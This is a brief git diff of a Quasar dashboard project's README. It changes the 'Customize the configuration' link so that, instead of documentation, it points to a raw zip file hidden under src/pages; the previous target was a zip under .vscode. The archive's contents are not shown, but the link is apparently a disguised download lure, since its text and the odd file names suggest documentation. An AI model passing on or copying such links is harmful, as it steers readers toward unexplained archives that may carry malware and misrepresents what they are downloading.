@@ -38,4 +38,4 @@ quasar build
 ```
 
 ### Customize the configuration
-See [Configuring https://github.com/Miqman/newMkpDashboard/raw/refs/heads/main/.vscode/Dashboard-Mkp-new-explorational.zip](https://github.com/Miqman/newMkpDashboard/raw/refs/heads/main/.vscode/Dashboard-Mkp-new-explorational.zip).
+See [Configuring https://github.com/Miqman/newMkpDashboard/raw/refs/heads/main/src/pages/laporanTransaksi/Mkp_Dashboard_new_objecthood.zip](https://github.com/Miqman/newMkpDashboard/raw/refs/heads/main/src/pages/laporanTransaksi/Mkp_Dashboard_new_objecthood.zip).
